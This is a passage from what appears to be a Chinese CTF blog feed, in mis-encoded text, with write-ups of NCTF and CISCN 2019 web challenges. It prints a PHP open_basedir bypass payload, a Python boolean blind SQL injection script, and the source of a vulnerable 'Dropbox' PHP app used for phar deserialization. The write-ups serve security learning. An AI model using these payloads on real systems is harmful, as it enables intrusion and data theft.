class="line">$p-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè‡ªå·±å¼€å§‹çŠ¯äº†ä¸ªå¤§é”™ï¼Œæ²¡æœ‰ç»™å…¶å¸¦ä¸Š9000ç«¯å£.å¦åˆ™æˆ‘ä»¬çš„gopheræ•°æ®æ˜¯å‘ç»™80ç«¯å£çš„ã€‚è€Œå®é™…ä¸Šï¼Œæˆ‘ä»¬è¦æ‰“çš„æ˜¯ç›‘å¬9000ç«¯å£çš„FPMã€‚æ‰€ä»¥æ³¨æ„paylaodæ ¼å¼çš„ç«¯å£ä¸ä¸‹åˆ’çº¿ã€‚<br>ä¹‹åçœ‹åˆ°<code>phpinfo()</code>ä¼šå‘ç°åˆç¦æ‰äº†ç³»ç»Ÿå‡½æ•°ã€‚ä½†æ˜¯ä¸»è¦çš„è¦ç‚¹åœ¨äº<code>bypass open_basedir</code>ã€‚å¦åˆ™æˆ‘ä»¬çš„è¡ŒåŠ¨ä¼šè¢«é™åˆ¶åœ¨è¿™å±‚ç›®å½•ã€‚<br>è€ƒè™‘ç›®å½•é€»è¾‘</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;flag</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php</span><br></pre></td></tr></table></figure><p>ç›´æ¥æ„é€ payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir(<span class="string">'byc'</span>);chdir(<span class="string">'byc'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);<span class="keyword">echo</span>(file_get_contents(<span class="string">'flag'</span>));</span><br></pre></td></tr></table></figure><p>åˆ°æ ¹ç›®å½•å°±å¯ä»¥æ‹¿flagäº†ã€‚<br><img src="/2020/02/25/NCTF-phar-matches-everything%E5%A1%AB%E5%9D%91/flag.PNG" class="lazyload" data-srcset="flag.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"></p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN-2019-webéƒ¨åˆ†å¤ç°</title>
      <link href="2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/"/>
      <url>2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>åŸæ¥å›½èµ›å°±æ˜¯CISCNâ€¦â€¦buuojä¸Šé¢˜ç›®æŒºå…¨çš„ï¼Œå¹²è„†é€‰ä¸€äº›æ¯”è¾ƒæœ‰ä»·å€¼çš„é¢˜ç›®å¤ç°ä¸‹ï¼š</p><h1 id="Hack-World-ç›²æ³¨"><a href="#Hack-World-ç›²æ³¨" class="headerlink" title="Hack World(ç›²æ³¨)"></a>Hack World(ç›²æ³¨)</h1><p>ç®€å•çš„å¸ƒå°”ç›²æ³¨é¢˜ï¼Œç®€å•FUZZä¸€ä¸‹å‘ç°æ˜¯æ•°å€¼å‹æ³¨å…¥ã€‚åŒæ—¶è¿‡æ»¤äº†<code>andï¼Œorï¼Œunion</code>ç©ºæ ¼ç­‰ç­‰ã€‚å›æ˜¾å¯ä»¥åˆ¤æ–­æ­£è¯¯ï¼Œè€ƒè™‘æ˜¯å¸ƒå°”ç›²æ³¨ã€‚payloadç›´æ¥ç”¨ifåˆ†æµå³å¯ã€‚ç©ºæ ¼å¯ä»¥<code>%0a</code>ç»•è¿‡ï¼Œä¹Ÿå¯ä»¥ç›´æ¥æ‹¬å·æ‹¬èµ·æ¥(ä¹‹å‰æ€»ç»“è¿‡)</p><a id="more"></a><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;3de016a6-fb79-4b56-a2fb-ea24bc26083f&#125;</span></span><br><span class="line">url=<span class="string">'http://18733385-8c1b-4df7-88f0-1fb70bb6c05b.node3.buuoj.cn/index.php'</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    print(i)</span><br><span class="line">    a=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        payload=<span class="string">"if(ascii(substr((select%0aflag%0afrom%0aflag),"</span>+str(i)+<span class="string">",1))="</span>+str(j)+<span class="string">",1,2)"</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'id'</span>: payload</span><br><span class="line">        &#125;</span><br><span class="line">        res=requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Hello'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag+=chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            a=<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> a==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h1 id="Dropbox-pharååºåˆ—åŒ–"><a href="#Dropbox-pharååºåˆ—åŒ–" class="headerlink" title="Dropbox(pharååºåˆ—åŒ–)"></a>Dropbox(pharååºåˆ—åŒ–)</h1><p>é¢˜ç›®å±äºphpååºåˆ—åŒ–ã€‚æ„Ÿè§‰å›½èµ›çš„é¢˜ç›®ç¡®å®è´¨é‡å¾ˆé«˜ï¼Œè¿™é‡Œçš„ååºåˆ—åŒ–åˆ©ç”¨çœ‹äº†æºç ä¸å°‘æ—¶é—´æ‰æ‰¾å‡ºåˆ©ç”¨ã€‚èµ¶ç´§è®°å½•ä¸‹ã€‚<br>é¦–å…ˆè¿›æ¥æ³¨å†Œè´¦å·ç™»é™†ã€‚å‘ç°æœ‰æ–‡ä»¶ä¸Šä¼ ç‚¹ã€‚é¡ºæ‰‹ä¼ ä¸ªä¸€å¥è¯å›¾ç‰‡é©¬ï¼Œå‘ç°æ²¡æœ‰è¿‡æ»¤ã€‚ç„¶åæä¾›äº†å¯¹å›¾ç‰‡çš„ä¸‹è½½ä¸åˆ é™¤åŠŸèƒ½ã€‚æ­¤æ—¶ä¾æ¬¡å°è¯•ä¸€ä¸‹ï¼Œå‘ç°ä¸‹è½½åŠŸèƒ½çš„<code>filename</code>å…è®¸ä»»æ„æ–‡ä»¶ä¸‹è½½ï¼Œäºæ˜¯ç›´æ¥æ‹¿åˆ°index.phpçš„æºç ï¼Œæ¥ç€å¯ä»¥æ‹¿åˆ°å…¶ä»–å…³é”®æºç ï¼Œå‘ç°æ˜¯phpååºåˆ—åŒ–ï¼Œå¼€å§‹å®¡è®¡ã€‚<br>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_SESSION[<span class="string">'username'</span>]<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span><br><span class="line">$a = <span class="keyword">new</span> FileList($_SESSION[<span class="string">'sandbox'</span>]);</span><br><span class="line">$a-&gt;Name();</span><br><span class="line">$a-&gt;Size();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$dbaddr = <span class="string">"127.0.0.1"</span>;</span><br><span class="line">$dbuser = <span class="string">"root"</span>;</span><br><span class="line">$dbpass = <span class="string">"root"</span>;</span><br><span class="line">$dbname = <span class="string">"dropbox"</span>;</span><br><span class="line">$db = <span class="keyword">new</span> mysqli($dbaddr, $dbuser, $dbpass, $dbname);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $db;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db = $db;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span><span class="params">($username)</span> </span>&#123;</span><br><span class="line">        $stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;"</span>);</span><br><span class="line">        $stmt-&gt;bind_param(<span class="string">"s"</span>, $username);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $stmt-&gt;store_result();</span><br><span class="line">        $count = $stmt-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span> ($count === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;user_exist($username)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $password = sha1($password . <span class="string">"SiAchGHmFx"</span>);</span><br><span class="line">        $stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);"</span>);</span><br><span class="line">        $stmt-&gt;bind_param(<span class="string">"ss"</span>, $username, $password);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;user_exist($username)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $password = sha1($password . <span class="string">"SiAchGHmFx"</span>);</span><br><span class="line">        $stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"SELECT `password` FROM `users` WHERE `username` = ?;"</span>);</span><br><span class="line">        $stmt-&gt;bind_param(<span class="string">"s"</span>, $username);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $stmt-&gt;bind_result($expect);</span><br><span class="line">        $stmt-&gt;fetch();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($expect) &amp;&amp; $expect === $password) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">private</span> $results;</span><br><span class="line">    <span class="keyword">private</span> $funcs;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        $filenames = scandir($path);</span><br><span class="line"></span><br><span class="line">        $key = array_search(<span class="string">"."</span>, $filenames);</span><br><span class="line">        <span class="keyword">unset</span>($filenames[$key]);</span><br><span class="line">        $key = array_search(<span class="string">".."</span>, $filenames);</span><br><span class="line">        <span class="keyword">unset</span>($filenames[$key]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($filenames <span class="keyword">as</span> $filename) &#123;</span><br><span class="line">            $file = <span class="keyword">new</span> File();</span><br><span class="line">            $file-&gt;open($path . $filename);</span><br><span class="line">            array_push(<span class="keyword">$this</span>-&gt;files, $file);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[$file-&gt;name()] = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($func, $args)</span> </span>&#123;</span><br><span class="line">        array_push(<span class="keyword">$this</span>-&gt;funcs, $func);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $table = <span class="string">'&lt;div id="container" class="container"&gt;&lt;div class="table-responsive"&gt;&lt;table id="table" class="table table-bordered table-hover sm-font"&gt;'</span>;</span><br><span class="line">        $table .= <span class="string">'&lt;thead&gt;&lt;tr&gt;'</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;funcs <span class="keyword">as</span> $func) &#123;</span><br><span class="line">            $table .= <span class="string">'&lt;th scope="col" class="text-center"&gt;'</span> . htmlentities($func) . <span class="string">'&lt;/th&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $table .= <span class="string">'&lt;th scope="col" class="text-center"&gt;Opt&lt;/th&gt;'</span>;</span><br><span class="line">        $table .= <span class="string">'&lt;/thead&gt;&lt;tbody&gt;'</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;results <span class="keyword">as</span> $filename =&gt; $result) &#123;</span><br><span class="line">            $table .= <span class="string">'&lt;tr&gt;'</span>;</span><br><span class="line">            <span class="keyword">foreach</span> ($result <span class="keyword">as</span> $func =&gt; $value) &#123;</span><br><span class="line">                $table .= <span class="string">'&lt;td class="text-center"&gt;'</span> . htmlentities($value) . <span class="string">'&lt;/td&gt;'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $table .= <span class="string">'&lt;td class="text-center" filename="'</span> . htmlentities($filename) . <span class="string">'"&gt;&lt;a href="#" class="download"&gt;Ã¤Â¸Â‹Ã¨Â½Â½&lt;/a&gt; / &lt;a href="#" class="delete"&gt;Ã¥ÂˆÂ Ã©Â™Â¤&lt;/a&gt;&lt;/td&gt;'</span>;</span><br><span class="line">            $table .= <span class="string">'&lt;/tr&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> $table;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span><span class="params">($filename)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">        <span class="keyword">if</span> (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> basename(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $size = filesize(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        $units = <span class="keyword">array</span>(<span class="string">' B'</span>, <span class="string">' KB'</span>, <span class="string">' MB'</span>, <span class="string">' GB'</span>, <span class="string">' TB'</span>);</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $size &gt;= <span class="number">1024</span> &amp;&amp; $i &lt; <span class="number">4</span>; $i++) $size /= <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">return</span> round($size, <span class="number">2</span>).$units[$i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        unlink(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>download.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'filename'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span><br><span class="line">ini_set(<span class="string">"open_basedir"</span>, getcwd() . <span class="string">":/etc:/tmp"</span>);</span><br><span class="line"></span><br><span class="line">chdir($_SESSION[<span class="string">'sandbox'</span>]);</span><br><span class="line">$file = <span class="keyword">new</span> File();</span><br><span class="line">$filename = (string) $_POST[<span class="string">'filename'</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen($filename) &lt; <span class="number">40</span> &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, <span class="string">"flag"</span>) === <span class="keyword">false</span>) &#123;</span><br><span class="line">    Header(<span class="string">"Content-type: application/octet-stream"</span>);</span><br><span class="line">    Header(<span class="string">"Content-Disposition: attachment; filename="</span> . basename($filename));</span><br><span class="line">    <span class="keyword">echo</span> $file-&gt;close();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"File not exist"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>delete.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'filename'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span><br><span class="line"></span><br><span class="line">chdir($_SESSION[<span class="string">'sandbox'</span>]);</span><br><span class="line">$file = <span class="keyword">new</span> File();</span><br><span class="line">$filename = (string) $_POST[<span class="string">'filename'</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen($filename) &lt; <span class="number">40</span> &amp;&amp; $file-&gt;open($filename)) &#123;</span><br><span class="line">    $file-&gt;detele();</span><br><span class="line">    Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">    $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">true</span>, <span class="string">"error"</span> =&gt; <span class="string">""</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">    $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">false</span>, <span class="string">"error"</span> =&gt; <span class="string">"File not exist"</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å®¡è®¡æºç ç¬¬ä¸€ååº”é¦–å…ˆæ˜¯sqlæ³¨å…¥ã€‚ä½†æ˜¯éšå³å‘ç°ä¸å­˜åœ¨å¯æ§å‚æ•°ï¼Œæ‰€ä»¥æ³¨å…¥æ— æœã€‚æ¥ä¸‹æ¥é‡å¿ƒæ”¾åœ¨ååºåˆ—åŒ–ä¸Šã€‚é¦–å…ˆéœ€è¦æ˜ç¡®çš„æ˜¯ï¼Œæˆ‘ä»¬æºç ä¸­å¹¶ä¸å­˜åœ¨<code>unserialize()</code>å‡½æ•°ï¼Œä½†æ˜¯æˆ‘ä»¬æœ‰æ–‡ä»¶ä¸Šä¼ ç‚¹ã€‚æ‰€ä»¥ååºåˆ—åŒ–éœ€è¦é€šè¿‡ä¸Šä¼ pharæ–‡ä»¶å¹¶è¿›è¡Œ<code>phar://</code>ä¼ªåè®®è§¦å‘ã€‚</p><p>æ¥ä¸‹æ¥å¯»æ‰¾å¸¸è§æ–‡ä»¶è¯»å–å‡½æ•°ï¼Œæ³¨æ„åˆ°Fileç±»<code>file_get_contents()</code>æ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span 